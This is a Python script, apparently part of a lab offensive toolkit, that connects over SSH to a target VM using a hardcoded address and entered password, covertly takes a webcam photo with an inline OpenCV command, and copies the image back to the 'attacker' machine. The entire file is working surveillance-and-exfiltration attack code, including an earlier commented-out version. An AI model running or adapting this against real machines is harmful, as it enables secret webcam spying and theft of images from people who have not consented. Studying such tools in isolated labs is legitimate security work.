# implementation steps: 
#Pre-Test Setup (Target VM)
# first open the target and attack machines 

# Execution Steps (Attack VM)
# Once the target is live, the tester performs the following on the "Attacker" machine:
# Library Installation: Ensure the environment has the necessary communication tools: pip install paramiko scp scapy
# Run the Attack: * Execute: python3 camera_capture.py
# Enter Password: When prompted, type the Target VM's user password (the text will be hidden).

# Wait for Confirmation: The terminal should display:
# Connected to [IP]
# Executing remote capture...
# Success! Photo saved as captured_from_target.jpg

# this was created with the help of chatgpt and stack overflow code 

import sys
import os
import getpass 
import paramiko

import scp

# This finds the directory two levels up and adds it to Python's search path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))

# Now you can use an absolute import instead of relative dots
from cybersploit_client.commands import Command 

TARGET_IP = "192.168.209.129"
USERNAME = "e1-target"

password = getpass.getpass(f"Enter password for {USERNAME}@{TARGET_IP}: ")

# def camera_capture():
#     try:
#         # 1. Connect to the Target VM
#         ssh = paramiko.SSHClient()
#         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#         ssh.connect(TARGET_IP, username=USERNAME, password=password)
        
#         print(f"Connected to {TARGET_IP}")

#         # 2. Command the target to take a photo
#         # This assumes the target has python and opencv installed
#         capture_command = (
#             "python3 -c 'import cv2, time; "
#             "cam = cv2.VideoCapture(0); "
#             "time.sleep(1); "
#             "for _ in range(30): cam.read(); "
#             "s, img = cam.read(); "
#             "cv2.imwrite(\"remote_snap.jpg\", img); "
#             "cam.release()'"
#         )
        
#         print("Executing remote capture...")
#         ssh.exec_command(capture_command)

#         # 3. Download the photo back to the Attacker VM
#         with scp.SCPClient(ssh.get_transport()) as scp_client:
#             scp_client.get("remote_snap.jpg", "captured_from_target.jpg")
        
#         print("Success! Photo saved as captured_from_target.jpg")
#         ssh.close()

#     except Exception as e:
#         print(f"Attack failed: {e}")

def camera_capture():
    try:
        # 1. Connect to the Target VM
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(TARGET_IP, username=USERNAME, password=password)
        
        print(f"Connected to {TARGET_IP}")

        # 2. Re-engineered capture command with strict inline execution loops
        capture_command = (
            "python3 -c 'import cv2, time; "
            "cam = cv2.VideoCapture(0); "
            "time.sleep(0.5); "
            "[cam.read() for _ in range(20)]; "  # Lightweight inline warmup loop
            "s, img = cam.read(); "
            "cv2.imwrite(\"remote_snap.jpg\", img); "
            "cam.release()'"
        )
        
        print("Executing remote capture...")
        stdin, stdout, stderr = ssh.exec_command(capture_command)

        # Wait for the target VM to finish capturing before moving to download step
        stdout.channel.recv_exit_status()

        # 3. Download the photo back to the Attacker VM
        with scp.SCPClient(ssh.get_transport()) as scp_client:
            scp_client.get("remote_snap.jpg", "captured_from_target.jpg")
        
        print("Success! Photo saved as captured_from_target.jpg")
        ssh.close()

    except Exception as e:
        print(f"Attack failed: {e}")

class CameraCapture(Command):
    """take pic with camera"""
    
    def do_command(self, lines: str, *args):
        camera_capture()

command = CameraCapture

if __name__ == "__main__":
    camera_capture()